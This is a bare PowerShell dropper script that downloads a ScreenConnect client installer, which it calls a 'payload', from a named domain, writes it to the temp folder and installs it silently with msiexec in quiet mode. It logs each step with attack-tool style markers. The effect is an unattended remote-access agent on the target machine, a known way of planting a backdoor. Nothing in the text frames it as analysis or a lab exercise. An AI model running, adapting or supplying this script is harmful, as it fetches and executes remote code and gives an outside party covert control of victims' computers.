$LogPath = "C:\Temp\Execution_Status.log"
$DesktopLog = "$env:USERPROFILE\Desktop\Execution_Status.log"

function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $entry = "[$timestamp] $Message"
    Add-Content -Path $LogPath -Value $entry -ErrorAction SilentlyContinue
    Add-Content -Path $DesktopLog -Value $entry -ErrorAction SilentlyContinue
}

try {
    Write-Log "[*] Remote script execution started."
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Tls13
    
    $targetUrl = "https://cibiconline.co/Bin/ScreenConnect.ClientSetup.msi?e=Access^&y=Guest^&c=mine^&c=^&c=^&c=^&c=^&c=^&c="
    Write-Log "[*] Downloading payload from remote target..."
    $WebClient = New-Object Net.WebClient
    $PayloadBytes = $WebClient.DownloadData($targetUrl)
    
    $TempPath = Join-Path $env:TEMP "ScreenConnect.msi"
    [System.IO.File]::WriteAllBytes($TempPath, $PayloadBytes)
    Write-Log "[+] Payload written to temp path: $TempPath"
    
    Write-Log "[*] Executing installer silently..."
    Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$TempPath`" /quiet /qn /norestart" -NoNewWindow -Wait
    Write-Log "[+] Success: Installer executed successfully."
} catch {
    Write-Log "[-] Error encountered: $_"
}
